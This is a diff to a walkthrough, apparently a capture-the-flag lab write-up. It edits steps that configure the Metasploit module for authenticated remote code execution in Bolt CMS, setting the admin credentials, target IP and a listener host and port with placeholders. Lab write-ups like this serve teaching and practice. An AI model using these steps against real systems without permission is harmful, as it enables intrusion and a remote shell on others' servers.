@@ -436,9 +436,9 @@ View the full module info with the info, or info -d command.
 
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
 ```
-16. `set PASSWORD {JAKE'S PASSWORD}` to set the value of the **PASSWORD** variable to the admin's password
-17. `set RHOSTS {TARGET IP}`
-18. `set USERNAME {JAKE'S USERNAME}`
+16. `set PASSWORD {JAKE'S PASSWORD}` to set the value of the **PASSWORD** variable to the target's admin password
+17. `set RHOSTS {TARGET IP}` to set the value of the ** RHOSTS** variable to our target's IP address
+18. `set USERNAME {JAKE'S USERNAME}` to set the value of the **USERNAME** variable to the target's admin username
 19. `set LHOST {MACHINE IP}`
 20. `set LPORT {PORT NUMBER}`
 21. `show options`
